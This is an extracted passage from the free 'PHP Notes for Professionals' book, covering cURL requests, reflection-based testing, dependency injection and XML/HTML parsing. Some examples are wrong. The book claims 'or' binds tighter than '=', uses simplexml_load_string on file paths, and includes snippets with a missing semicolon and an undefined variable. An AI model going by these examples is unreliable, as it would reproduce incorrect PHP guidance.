PHP
Notes for ProfessionalsPHP
Notes for Professionals
GoalKicker.com
Free Programming BooksDisclaimer
This is an unocial free book created for educational purposes and is
not aliated with ocial PHP group(s) or company(s).
All trademarks and registered trademarks are
the property of their respective owners
400+ pages
of professional hints and tricks

Contents
About  1  ................................................................................................................................................................................... 
# send the request
$result = curl_exec ($ch);

GoalKicker.com – PHP Notes for Professionals 192The second step (after standard error checking is done) is usually a simple GET request. The important thing is to
reuse the existing cURL handle  for the second request. This ensures the cookies from the ﬁrst response will be
automatically included in the second request.
# we are not calling curl_init()
# simply change the URL
curl_setopt ($ch, CURLOPT_URL , "https://www.example.com/show_me_the_foo.php" );
# change the method back to GET
curl_setopt ($ch, CURLOPT_HTTPGET , true);
# send the request
$result = curl_exec ($ch);
# finished with cURL
curl_close ($ch);
# do stuff with $result...
This is only intended as an example of cookie handling. In real life, things are usually more complicated. Often you
must perform an initial GET of the login page to pull a login token that needs to be included in your POST. Other
sites might block the cURL client based on its User-Agent string, requiring you to change it.
Section 33.4: Using multi_curl to make multiple POST
requests
Sometimes we need to make a lot of POST requests to one or many diﬀerent endpoints. To deal with this scenario,
we can use multi_curl .
First of all, we create how many requests as needed exactly in the same way of the simple example and put them in
an array.
We use the curl_multi_init and add each handle to it.
In this example, we are using 2 diﬀerent endpoints:
//array of data to POST
$request_contents  = array();
//array of URLs
$urls = array();
//array of cURL handles
$chs = array();
//first POST content
$request_contents [] = [
    'a' => 'apple',
    'b' => 'banana'
];
//second POST content
$request_contents [] = [
    'a' => 'fish',
    'b' => 'shrimp'
];
//set the urls
$urls[] = 'http://www.example.com' ;
$urls[] = 'http://www.example2.com' ;

GoalKicker.com – PHP Notes for Professionals 193//create the array of cURL handles and add to a multi_curl
$mh = curl_multi_init ();
foreach ($urls as $key => $url) {
    $chs[$key] = curl_init ($url);
    curl_setopt ($chs[$key], CURLOPT_RETURNTRANSFER , true);
    curl_setopt ($chs[$key], CURLOPT_POST , true);
    curl_setopt ($chs[$key], CURLOPT_POSTFIELDS , $request_contents [$key]);
    curl_multi_add_handle ($mh, $chs[$key]);
}
Then, we use curl_multi_exec to send the requests
//running the requests
$running  = null;
do {
  curl_multi_exec ($mh, $running );
} while ($running );
//getting the responses
foreach(array_keys ($chs) as $key){
    $error = curl_error ($chs[$key]);
    $last_effective_URL  = curl_getinfo ($chs[$key], CURLINFO_EFFECTIVE_URL );
    $time = curl_getinfo ($chs[$key], CURLINFO_TOTAL_TIME );
    $response  = curl_multi_getcontent ($chs[$key]);  // get results
    if (!empty($error)) {
      echo "The request $key return a error: $error" . "\n";
    }
    else {
      echo "The request to ' $last_effective_URL ' returned ' $response ' in $time seconds."  . "\n";
    }
    curl_multi_remove_handle ($mh, $chs[$key]);
}
// close current handler
curl_multi_close ($mh);
A possible return for this example could be:
The request to ' http://www.example.com ' returned 'fruits' in 2 seconds.
The request to ' http://www.example2.com ' returned 'seafood' in 5 seconds.
Section 33.5: Sending multi-dimensional data and multiple
ﬁles with CurlFile in one request
Let's say we have a form like the one below. We want to send the data to our webserver via AJAX and from there to
a script running on an external server.

GoalKicker.com – PHP Notes for Professionals 194
So we have normal inputs, a multi-select ﬁeld and a ﬁle dropzone where we can upload multiple ﬁles.
Assuming the AJAX POST request was successful we get the following data on PHP site:
// print_r($_POST)
Array
(
    [first_name ] => John
    [last_name ] => Doe
    [activities ] => Array
        (
            [0] => soccer
            [1] => hiking
        )
)
and the ﬁles should look like this
// print_r($_FILES)
Array
(
    [upload] => Array
        (
            [name] => Array
                (
                    [0] => my_photo .jpg
                    [1] => my_life .pdf
                )

GoalKicker.com – PHP Notes for Professionals 195            [type] => Array
                (
                    [0] => image/jpg
                    [1] => application /pdf
                )
            [tmp_name ] => Array
                (
                    [0] => /tmp/phpW5spji
                    [1] => /tmp/phpWgnUeY
                )
            [error] => Array
                (
                    [0] => 0
                    [1] => 0
                )
            [size] => Array
                (
                    [0] => 647548
                    [1] => 643223
                )
        )
)
So far, so good. Now we want to send this data and ﬁles to the external server using cURL with the CurlFile Class
Since cURL only accepts a simple but not a multi-dimensional array, we have to ﬂatten the $_POST array ﬁrst.
To do this, you could use this function for example  which gives you the following:
// print_r($new_post_array)
Array
(
    [first_name ] => John
    [last_name ] => Doe
    [activities [0]] => soccer
    [activities [1]] => hiking
)
The next step is to create CurlFile Objects for the uploaded ﬁles. This is done by the following loop:
$files = array();
foreach ($_FILES["upload" ]["error"] as $key => $error) {
    if ($error == UPLOAD_ERR_OK ) {
        $files["upload[ $key]"] = curl_file_create (
            $_FILES['upload' ]['tmp_name' ][$key],
            $_FILES['upload' ]['type'][$key],
            $_FILES['upload' ]['name'][$key]
        );
    }
}
curl_ﬁle_create is a helper function of the CurlFile Class and creates the CurlFile objects. We save each object in the

GoalKicker.com – PHP Notes for Professionals 196$ﬁles array with keys named "upload[0]" and "upload[1]" for our two ﬁles.
We now have to combine the ﬂattened post array and the ﬁles array and save it as $data like this:
$data = $new_post_array  + $files;
The last step is to send the cURL request:
$ch = curl_init ();
curl_setopt_array ($ch, array(
    CURLOPT_POST => 1,
    CURLOPT_URL => "https://api.externalserver.com/upload.php" ,
    CURLOPT_RETURNTRANSFER => 1,
    CURLINFO_HEADER_OUT => 1,
    CURLOPT_POSTFIELDS => $data
));
$result = curl_exec ($ch);
curl_close  ($ch);
Since $data is now a simple (ﬂat) array, cURL automatically sends this POST request with Content Type:
multipart/form-data
In upload.php on the external server you can now get the post data and ﬁles with $_POST and $_FILES as you would
normally do.
Section 33.6: Creating and sending a request with a custom
method
By default, PHP Curl supports GET and POST  requests. It is possible to also send custom requests, such as DELETE ,
PUT or PATCH  (or even non-standard methods) using the CURLOPT_CUSTOMREQUEST  parameter.
$method = 'DELETE' ; // Create a DELETE request
$ch = curl_init ($url);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER , 1);
curl_setopt ($ch, CURLOPT_CUSTOMREQUEST , $method);
$content  = curl_exec ($ch);
curl_close ($ch);
Section 33.7: Get and Set custom http headers in php
Sending The Request Header
$uri = 'http://localhost/http.php' ;
$ch = curl_init ($uri);
curl_setopt_array ($ch, array(
    CURLOPT_HTTPHEADER  => array('X-User: admin' , 'X-Authorization: 123456' ),
    CURLOPT_RETURNTRANSFER  =>true,
    CURLOPT_VERBOSE     => 1
));
$out = curl_exec ($ch);
curl_close ($ch);
// echo response output
echo $out;

GoalKicker.com – PHP Notes for Professionals 197Reading the custom header
print_r(apache_request_headers ());
Output:
Array
(
    [Host] => localhost
    [Accept] => */*
    [X-User] => admin
    [X-Authorization] => 123456
    [Content-Length] => 9
    [Content-Type] => application/x-www-form-urlencoded
)
We can also send the header using below syntax:
curl --header "X-MyHeader: 123"  www.google.com

GoalKicker.com – PHP Notes for Professionals 198Chapter 34: Reﬂection
Section 34.1: Feature detection of classes or objects
Feature detection of classes can partly be done with the property_exists  and method_exists  functions.
class MyClass {
    public $public_field ;
    protected  $protected_field ;
    private $private_field ;
    static $static_field ;
    const CONSTANT  = 0;
    public function  public_function () {}
    protected  function  protected_function () {}
    private function  private_function () {}
    static function  static_function () {}
}
// check properties
$check = property_exists ('MyClass' , 'public_field' );    // true
$check = property_exists ('MyClass' , 'protected_field' ); // true
$check = property_exists ('MyClass' , 'private_field' );   // true, as of PHP 5.3.0
$check = property_exists ('MyClass' , 'static_field' );    // true
$check = property_exists ('MyClass' , 'other_field' );     // false
// check methods
$check = method_exists ('MyClass' , 'public_function' );    // true
$check = method_exists ('MyClass' , 'protected_function' );    // true
$check = method_exists ('MyClass' , 'private_function' );    // true
$check = method_exists ('MyClass' , 'static_function' );    // true
// however...
$check = property_exists ('MyClass' , 'CONSTANT' );  // false
$check = property_exists ($object, 'CONSTANT' );    // false
With a ReflectionClass , also constants can be detected:
$r = new ReflectionClass ('MyClass' );
$check = $r->hasProperty ('public_field' );  // true
$check = $r->hasMethod ('public_function' ); // true
$check = $r->hasConstant ('CONSTANT' );      // true
// also works for protected, private and/or static members.
Note: for property_exists  and method_exists , also an object of the class of interest can be provided instead of the
class name. Using reﬂection, the ReflectionObject  class should be used instead of ReflectionClass .
Section 34.2: Testing private/protected methods
Sometimes it's useful to test private & protected methods as well as public ones.
class Car
{
    /**
     * @param mixed $argument
     *
     * @return mixed
     */
    protected  function  drive($argument )

GoalKicker.com – PHP Notes for Professionals 199    {
        return $argument ;
    }
    /**
     * @return bool
     */
    private static function  stop()
    {
        return true;
    }
}
Easiest way to test drive method is using reﬂection
class DriveTest
{
    /**
     * @test
     */
    public function  testDrive ()
    {
        // prepare
        $argument  = 1;
        $expected  = $argument ;
        $car = new \Car();
        $reflection  = new ReflectionClass (\Car::class);
        $method = $reflection ->getMethod ('drive');
        $method->setAccessible (true);
        // invoke logic
        $result = $method->invokeArgs ($car, [$argument ]);
        // test
        $this->assertEquals ($expected , $result);
    }
}
If the method is static you pass null in the place of the class instance
class StopTest
{
    /**
     * @test
     */
    public function  testStop ()
    {
        // prepare
        $expected  = true;
        $reflection  = new ReflectionClass (\Car::class);
        $method = $reflection ->getMethod ('stop');
        $method->setAccessible (true);
        // invoke logic
        $result = $method->invoke(null);
        // test
        $this->assertEquals ($expected , $result);
    }

GoalKicker.com – PHP Notes for Professionals 200}
Section 34.3: Accessing private and protected member
variables
Reﬂection is often used as part of software testing, such as for the runtime creation/instantiation of mock objects.
It's also great for inspecting the state of an object at any given point in time. Here's an example of using Reﬂection
in a unit test to verify a protected class member contains the expected value.
Below is a very basic class for a Car. It has a protected member variable that will contain the value representing the
color of the car. Because the member variable is protected we cannot access it directly and must use a getter and
setter method to retrieve and set its value respectively.
class Car
{
    protected  $color
   
    public function  setColor ($color)
    {
        $this->color = $color;
    }
   
    public function  getColor ($color)
    {
        return $this->color;
    }
}
To test this many developers will create a Car object, set the car's color using Car::setColor (), retrieve the color
using Car::getColor (), and compare that value to the color they set:
/**
 * @test
 * @covers     \Car::setColor
 */
public function  testSetColor ()
{
    $color = 'Red';
    $car = new \Car();
    $car->setColor ($color);
    $getColor  = $car->getColor ();
       
    $this->assertEquals ($color, $reflectionColor );
}
On the surface this seems okay. After all, all Car::getColor () does is return the value of the protected member
variable Car::$color . But this test is ﬂawed in two ways:
It exercises Car::getColor () which is out of the scope of this test 1.
It depends on Car::getColor () which may have a bug itself which can make the test have a false positive or 2.
negative
Let's look at why we shouldn't use Car::getColor () in our unit test and should use Reﬂection instead. Let's say a
developer is assigned a task to add "Metallic" to every car color. So they attempt to modify the Car::getColor () to
prepend "Metallic" to the car's color:

GoalKicker.com – PHP Notes for Professionals 201class Car
{
    protected  $color
   
    public function  setColor ($color)
    {
        $this->color = $color;
    }
   
    public function  getColor ($color)
    {
        return "Metallic " ; $this->color;
    }
}
Do you see the error? The developer used a semi-colon instead of the concatenation operator in an attempt to
prepend "Metallic" to the car's color. As a result, whenever Car::getColor () is called, "Metallic " will be returned
regardless of what the car's actual color is. As a result our Car::setColor () unit test will fail even though
Car::setColor () works perfectly ﬁne and was not aﬀected by this change .
So how do we verify Car::$color  contains the value we are setting via Car::setColor ()? We can use Refelection to
inspect the protected member variable directly. So how do we do that? We can use Refelection to make the
protected member variable accessible to our code so it can retrieve the value.
Let's see the code ﬁrst and then break it down:
/**
 * @test
 * @covers     \Car::setColor
 */
public function  testSetColor ()
{
    $color = 'Red';
    $car = new \Car();
    $car->setColor ($color);
   
    $reflectionOfCar  = new \ReflectionObject ($car);
    $protectedColor  = $reflectionOfForm ->getProperty ('color');
    $protectedColor ->setAccessible (true);
    $reflectionColor  = $protectedColor ->getValue ($car);
   
    $this->assertEquals ($color, $reflectionColor );
}
Here is how we are using Reﬂection to get the value of Car::$color  in the code above:
We create a new ReﬂectionObject  representing our Car object 1.
We get a ReﬂectionProperty  for Car::$color  (this "represents" the Car::$color  variable) 2.
We make Car::$color  accessible 3.
We get the value of Car::$color 4.
As you can see by using Reﬂection we could get the value of Car::$color  without having to call Car::getColor () or
any other accessor function which could cause invalid test results. Now our unit test for Car::setColor () is safe
and accurate.

GoalKicker.com – PHP Notes for Professionals 202Chapter 35: Dependency Injection
Dependency Injection (DI) is a fancy term for "passing things in" . All it really means is passing the dependencies of an
object via the constructor and / or setters instead of creating them upon object creation inside the object.
Dependency Injection might also refer to Dependency Injection Containers which automate the construction and
injection.
Section 35.1: Constructor Injection
Objects will often depend on other objects. Instead of creating the dependency in the constructor, the dependency
should be passed into the constructor as a parameter. This ensures there is not tight coupling between the objects,
and enables changing the dependency upon class instantiation. This has a number of beneﬁts, including making
code easier to read by making the dependencies explicit, as well as making testing simpler since the dependencies
can be switched out and mocked more easily.
In the following example, Component  will depend on an instance of Logger , but it doesn't create one. It requires one
to be passed as argument to the constructor instead.
interface  Logger {
    public function  log(string $message );
}
class Component {
    private $logger;
    public function  __construct (Logger $logger) {
        $this->logger = $logger;
    }
}
Without dependency injection, the code would probably look similar to:
class Component {
    private $logger;
    public function  __construct () {
        $this->logger = new FooLogger ();
    }
}
Using new to create new objects in the constructor indicates that dependency injection was not used (or was used
incompletely), and that the code is tightly coupled. It is also a sign that the code is incompletely tested or may have
brittle tests that make incorrect assumptions about program state.
In the above example, where we are using dependency injection instead, we could easily change to a diﬀerent
Logger if doing so became necessary. For example, we might use a Logger implementation that logs to a diﬀerent
location, or that uses a diﬀerent logging format, or that logs to the database instead of to a ﬁle.
Section 35.2: Setter Injection
Dependencies can also be injected by setters.
interface  Logger {
    public function  log($message );
}

GoalKicker.com – PHP Notes for Professionals 203class Component {
    private $logger;
    private $databaseConnection ;
    public function  __construct (DatabaseConnection $databaseConnection ) {
        $this->databaseConnection  = $databaseConnection ;
    }
    public function  setLogger (Logger $logger) {
        $this->logger = $logger;
    }
    public function  core() {
        $this->logSave();    
        return $this->databaseConnection ->save($this);
    }
    public function  logSave () {
         if ($this->logger) {
            $this->logger->log('saving' );
        }
    }
}
This is especially interesting when the core functionality of the class does not rely on the dependency to work.
Here, the only  needed dependency is the DatabaseConnection  so it's in the constructor. The Logger  dependency is
optional and thus does not need to be part of the constructor, making the class easier to use.
Note that when using setter injection, it's better to extend the functionality rather than replacing it. When setting a
dependency, there's nothing conﬁrming that the dependency won't change at some point, which could lead in
unexpected results. For example, a FileLogger  could be set at ﬁrst, and then a MailLogger  could be set. This
breaks encapsulation and makes logs hard to ﬁnd, because we're replacing  the dependency.
To prevent this, we should add a dependency with setter injection, like so:
interface  Logger {
    public function  log($message );
}
class Component {
    private $loggers  = array();
    private $databaseConnection ;
    public function  __construct (DatabaseConnection $databaseConnection ) {
        $this->databaseConnection  = $databaseConnection ;
    }
    public function  addLogger (Logger $logger) {
        $this->loggers[] = $logger;
    }
    public function  core() {
        $this->logSave();
        return $this->databaseConnection ->save($this);
    }
    public function  logSave () {
        foreach ($this->loggers as $logger) {
            $logger->log('saving' );

GoalKicker.com – PHP Notes for Professionals 204        }
    }
}
Like this, whenever we'll use the core functionality, it won't break even if there is no logger dependency added, and
any logger added will be used even though another logger could've been added. We're extending  functionality
instead of replacing  it.
Section 35.3: Container Injection
Dependency Injection (DI) in the context of using a Dependency Injection Container (DIC) can be seen as a superset
of constructor injection. A DIC will typically analyze a class constructor's typehints and resolve its needs, eﬀectively
injecting the dependencies needed for the instance execution.
The exact implementation goes well beyond the scope of this document but at its very heart, a DIC relies on using
the signature of a class...
namespace  Documentation ;
class Example
{
    private $meaning ;
    public function  __construct (Meaning $meaning )
    {
        $this->meaning = $meaning ;
    }
}
... to automatically instantiate it, relying most of the time on an autoloading system.
// older PHP versions
$container ->make('Documentation\Example' );
// since PHP 5.5
$container ->make(\Documentation\Example ::class);
If you are using PHP in version at least 5.5 and want to get a name of a class in a way that's being shown above, the
correct way is the second approach. That way you can quickly ﬁnd usages of the class using modern IDEs, which will
greatly help you with potential refactoring. You do not want to rely on regular strings.
In this case, the Documentation\Example  knows it needs a Meaning , and a DIC would in turn instantiate a Meaning
type. The concrete implementation need not depend on the consuming instance.
Instead, we set rules in the container, prior to object creation, that instructs how speciﬁc types should be
instantiated if need be.
This has a number of advantages, as a DIC can
Share common instances
Provide a factory to resolve a type signature
Resolve an interface signature
If we deﬁne rules about how speciﬁc type needs to be managed we can achieve ﬁne control over which types are
shared, instantiated, or created from a factory.

GoalKicker.com – PHP Notes for Professionals 205Chapter 36: XML
Section 36.1: Create a XML using DomDocument
To create a XML using DOMDocument,basically, we need to create all the tags and attributes using the
createElement () and createAttribute () methods and them create the XML structure with the appendChild ().
The example below includes tags, attributes, a CDATA section and a diﬀerent namespace for the second tag:
$dom = new DOMDocument ('1.0', 'utf-8');
$dom->preserveWhiteSpace  = false;
$dom->formatOutput  = true;
//create the main tags, without values
$books = $dom->createElement ('books');
$book_1 = $dom->createElement ('book');
// create some tags with values
$name_1 = $dom->createElement ('name', 'PHP - An Introduction' );
$price_1  = $dom->createElement ('price', '$5.95');
$id_1 = $dom->createElement ('id', '1');
//create  and append an attribute
$attr_1 = $dom->createAttribute ('version' );
$attr_1->value = '1.0';
//append the attribute
$id_1->appendChild ($attr_1);
//create the second tag book with different namespace
$namespace  = 'www.example.com/libraryns/1.0' ;
//include the namespace prefix in the books tag
$books->setAttributeNS ('http://www.w3.org/2000/xmlns/' , 'xmlns:ns' , $namespace );
$book_2 = $dom->createElementNS ($namespace ,'ns:book' );
$name_2 = $dom->createElementNS ($namespace , 'ns:name' );
//create a CDATA section (that is another DOMNode instance) and put it inside the name tag
$name_cdata  = $dom->createCDATASection ('PHP - Advanced' );
$name_2->appendChild ($name_cdata );
$price_2  = $dom->createElementNS ($namespace , 'ns:price' , '$25.00' );
$id_2 = $dom->createElementNS ($namespace , 'ns:id', '2');
//create the XML structure
$books->appendChild ($book_1);
$book_1->appendChild ($name_1);
$book_1->appendChild ($price_1 );
$book_1->appendChild ($id_1);
$books->appendChild ($book_2);
$book_2->appendChild ($name_2);
$book_2->appendChild ($price_2 );
$book_2->appendChild ($id_2);
$dom->appendChild ($books);
//saveXML() method returns the XML in a String
print_r ($dom->saveXML());
This will output the following XML:

GoalKicker.com – PHP Notes for Professionals 206<?xml version="1.0" encoding ="utf-8"?>
<books xmlns:ns ="www.example.com/libraryns/1.0" >
  <book>
    <name>PHP - An Introduction </name>
    <price>$5.95</price>
    <id version="1.0">1</id>
  </book>
  <ns:book >
    <ns:name ><![CDATA[PHP - Advanced]]> </ns:name >
    <ns:price >$25.00</ns:price >
    <ns:id>2</ns:id>
  </ns:book >
</books>
Section 36.2: Read a XML document with DOMDocument
Similarly to the SimpleXML, you can use DOMDocument to parse XML from a string or from a XML ﬁle
1. From a string
$doc = new DOMDocument ();
$doc->loadXML($string);
2. From a ﬁle
$doc = new DOMDocument ();
$doc->load('books.xml' );// use the actual file path. Absolute or relative
Example of parsing
Considering the following XML:
<?xml version="1.0" encoding ="UTF-8"?>
<books>
   <book>
      <name>PHP - An Introduction </name>
      <price>$5.95</price>
      <id>1</id>
   </book>
   <book>
      <name>PHP - Advanced </name>
      <price>$25.00</price>
      <id>2</id>
   </book>
</books>
This is a example code to parse it
$books = $doc->getElementsByTagName ('book');
foreach ($books as $book) {
    $title = $book->getElementsByTagName ('name')->item(0)->nodeValue ;
    $price = $book->getElementsByTagName ('price')->item(0)->nodeValue ;
    $id = $book->getElementsByTagName ('id')->item(0)->nodeValue ;
    print_r ("The title of the book $id is $title and it costs $price." . "\n");
}
This will output:

GoalKicker.com – PHP Notes for Professionals 207The title of the book 1 is PHP - An Introduction and it costs $5.95.
The title of the book 2 is PHP - Advanced and it costs $25.00.
Section 36.3: Leveraging XML with PHP's SimpleXML Library
SimpleXML is a powerful library which converts XML strings to an easy to use PHP object.
The following assumes an XML structure as below.
<?xml version="1.0" encoding ="UTF-8"?>
<document >
    <book>
        <bookName >StackOverflow SimpleXML Example </bookName >
        <bookAuthor >PHP Programmer </bookAuthor >
    </book>
    <book>
        <bookName >Another SimpleXML Example </bookName >
        <bookAuthor >Stack Overflow Community </bookAuthor >
        <bookAuthor >PHP Programmer </bookAuthor >
        <bookAuthor >FooBar</bookAuthor >
    </book>
</document >
Read our data in to SimpleXML
To get started, we need to read our data into SimpleXML. We can do this in 3 diﬀerent ways. Firstly, we can load our
data from a DOM node.
$xmlElement  = simplexml_import_dom ($domNode );
Our next option is to load our data from an XML ﬁle.
$xmlElement  = simplexml_load_file ($filename );
Lastly, we can load our data from a variable.
$xmlString  = '<?xml version="1.0" encoding="UTF-8"?>
<document>
    <book>
        <bookName>StackOverflow SimpleXML Example</bookName>
        <bookAuthor>PHP Programmer</bookAuthor>
    </book>
    <book>
        <bookName>Another SimpleXML Example</bookName>
        <bookAuthor>Stack Overflow Community</bookAuthor>
        <bookAuthor>PHP Programmer</bookAuthor>
        <bookAuthor>FooBar</bookAuthor>
    </book>
</document>' ;
$xmlElement  = simplexml_load_string ($xmlString );
Whether you've picked to load from a DOM Element , from a ﬁle  or from a string , you are now left with a
SimpleXMLElement variable called $xmlElement . Now, we can start to make use of our XML in PHP.
Accessing our SimpleXML Data

GoalKicker.com – PHP Notes for Professionals 208The simplest way to access data in our SimpleXMLElement object is to call the properties directly . If we want to
access our ﬁrst bookName, StackOverflow SimpleXML Example , then we can access it as per below.
echo $xmlElement ->book->bookName ;
At this point, SimpleXML will assume that because we have not told it explicitly which book we want, that we want
the ﬁrst one. However, if we decide that we do not want the ﬁrst one, rather that we want Another SimpleXML
Example , then we can access it as per below.
echo $xmlElement ->book[1]->bookName ;
It is worth noting that using [0] works the same as not using it, so
$xmlElement ->book
works the same as
$xmlElement ->book[0]
Looping through our XML
There are many reasons you may wish to loop through XML , such as that you have a number of items, books in our
case, that we would like to display on a webpage. For this, we can use a foreach loop  or a standard for loop , taking
advantage of SimpleXMLElement's count function. .
foreach ( $xmlElement ->book as $thisBook  ) {
    echo $thisBook ->bookName
}
or
$count = $xmlElement ->count();
for ( $i=0; $i<$count; $i++ ) {
    echo $xmlElement ->book[$i]->bookName ;
}
Handling Errors
Now we have come so far, it is important to realise that we are only humans, and will likely encounter an error
eventually - especially if we are playing with diﬀerent XML ﬁles all the time. And so, we will want to handle those
errors.
Consider we created an XML ﬁle. You will notice that while this XML is much alike what we had earlier, the problem
with this XML ﬁle is that the ﬁnal closing tag is /doc instead of /document.
<?xml version="1.0" encoding ="UTF-8"?>
<document >
    <book>
        <bookName >StackOverflow SimpleXML Example </bookName >
        <bookAuthor >PHP Programmer </bookAuthor >
    </book>
    <book>
        <bookName >Another SimpleXML Example </bookName >
        <bookAuthor >Stack Overflow Community </bookAuthor >
        <bookAuthor >PHP Programmer </bookAuthor >
        <bookAuthor >FooBar</bookAuthor >

GoalKicker.com – PHP Notes for Professionals 209    </book>
</doc>
Now, say, we load this into our PHP as $ﬁle.
libxml_use_internal_errors (true);
$xmlElement  = simplexml_load_file ($file);
if ( $xmlElement  === false ) {
    $errors = libxml_get_errors ();
    foreach ( $errors as $thisError  ) {
        switch ( $thisError ->level ) {
            case LIBXML_ERR_FATAL :
                echo "FATAL ERROR: " ;
                break;
            case LIBXML_ERR_ERROR :
                echo "Non Fatal Error: " ;
                break;
            case LIBXML_ERR_WARNING :
                echo "Warning: " ;
                break;
        }
        echo $thisError ->code . PHP_EOL .
            'Message: '  . $thisError ->message . PHP_EOL .
            'Line: '  . $thisError ->line . PHP_EOL .
            'Column: '  . $thisError ->column . PHP_EOL .
            'File: '  . $thisError ->file;
    }
    libxml_clear_errors ();
} else {
    echo 'Happy Days' ;
}
We will be greeted with the following
FATAL ERROR : 76
Message: Opening and ending tag mismatch : document line 2 and doc
Line: 13
Column: 10
File: filepath /filename .xml
However as soon as we ﬁx this problem, we are presented with "Happy Days".
Section 36.4: Create an XML ﬁle using XMLWriter
Instantiate a XMLWriter object:
$xml = new XMLWriter ();
Next open the ﬁle to which you want to write. For example, to write to /var/www/example.com/xml/output.xml,
use:
$xml->openUri('file:///var/www/example.com/xml/output.xml' );
To start the document (create the XML open tag):
$xml->startDocument ('1.0', 'utf-8');

GoalKicker.com – PHP Notes for Professionals 210This will output:
<?xml version="1.0" encoding ="UTF-8"?>
Now you can start writing elements:
$xml->writeElement ('foo', 'bar');
This will generate the XML:
<foo>bar</foo>
If you need something a little more complex than simply nodes with plain values, you can also "start" an element
and add attributes to it before closing it:
$xml->startElement ('foo');
$xml->writeAttribute ('bar', 'baz');
$xml->writeCdata ('Lorem ipsum' );
$xml->endElement ();
This will output:
<foo bar="baz"><![CDATA[Lorem ipsum]]> </foo>
Section 36.5: Read a XML document with SimpleXML
You can parse XML from a string or from a XML ﬁle
1. From a string
$xml_obj  = simplexml_load_string ($string);
2. From a ﬁle
$xml_obj  = simplexml_load_file ('books.xml' );
Example of parsing
Considering the following XML:
<?xml version="1.0" encoding ="UTF-8"?>
<books>
   <book>
      <name>PHP - An Introduction </name>
      <price>$5.95</price>
      <id>1</id>
   </book>
   <book>
      <name>PHP - Advanced </name>
      <price>$25.00</price>
      <id>2</id>
   </book>
</books>
This is a example code to parse it

GoalKicker.com – PHP Notes for Professionals 211$xml = simplexml_load_string ($xml_string );
$books = $xml->book;
foreach ($books as $book) {
    $id = $book->id;
    $title = $book->name;
    $price = $book->price;
    print_r ("The title of the book $id is $title and it costs $price." . "\n");
}
This will output:
The title of the book 1 is PHP - An Introduction and it costs $5.95.
The title of the book 2 is PHP - Advanced and it costs $25.00.

GoalKicker.com – PHP Notes for Professionals 212Chapter 37: SimpleXML
Section 37.1: Loading XML data into simplexml
Loading from string
Use simplexml_load_string  to create a SimpleXMLElement  from a string:
$xmlString  = "<?xml version='1.0' encoding='UTF-8'?>" ;
$xml = simplexml_load_string ($xmlString ) or die("Error: Cannot create object" );
Note that or not || must be used here because the precedence of or is higher than =. The code after or will only be
executed if $xml  ﬁnally resolves to false.
Loading from ﬁle
Use simplexml_load_file  to load XML data from a ﬁle or a URL:
$xml = simplexml_load_string ("filePath.xml" );
$xml = simplexml_load_string ("https://example.com/doc.xml" );
The URL can be of any schemes that PHP supports , or custom stream wrappers.

GoalKicker.com – PHP Notes for Professionals 213Chapter 38: Parsing HTML
Section 38.1: Parsing HTML from a string
PHP implements a DOM Level 2  compliant parser, allowing you to work with HTML using familiar methods like
getElementById () or appendChild ().
$html = '<html><body><span id="text">Hello, World!</span></body></html>' ;
$doc = new DOMDocument ();
libxml_use_internal_errors (true);
$doc->loadHTML ($html);
echo $doc->getElementById ("text")->textContent ;
Outputs:
Hello, World!
Note that PHP will emit warnings about any problems with the HTML, especially if you are importing a document
fragment. To avoid these warnings, tell the DOM library (libxml) to handle its own errors by calling
libxml_use_internal_errors () before importing your HTML. You can then use libxml_get_errors () to handle
errors if needed.
Section 38.2: Using XPath
$html = '<html><body><span class="text">Hello, World!</span></body></html>' ;
$doc = new DOMDocument ();
$doc->loadHTML ($html);
$xpath = new DOMXPath ($doc);
$span = $xpath->query("//span[@class='text']" )->item(0);
echo $span->textContent ;
Outputs:
Hello, World!
Section 38.3: SimpleXML
Presentation
SimpleXML is a PHP library which provides an easy way to work with XML documents (especially reading and
iterating through XML data).
The only restraint is that the XML document must be well-formed.
Parsing XML using procedural approach
// Load an XML string
$xmlstr = file_get_contents ('library.xml' );

GoalKicker.com – PHP Notes for Professionals 214$library  = simplexml_load_string ($xmlstr);
// Load an XML file
$library  = simplexml_load_file ('library.xml' );
// You can load a local file path or a valid URL (if allow_url_fopen is set to "On" in php.ini
Parsing XML using OOP approach
// $isPathToFile: it informs the constructor that the 1st argument represents the path to a file,
// rather than a string that contains 1the XML data itself.
// Load an XML string
$xmlstr = file_get_contents ('library.xml' );
$library  = new SimpleXMLElement ($xmlstr);
// Load an XML file
$library  = new SimpleXMLElement ('library.xml' , NULL, true);
// $isPathToFile: it informs the constructor that the first argument represents the path to a file,
rather than a string that contains 1the XML data itself.
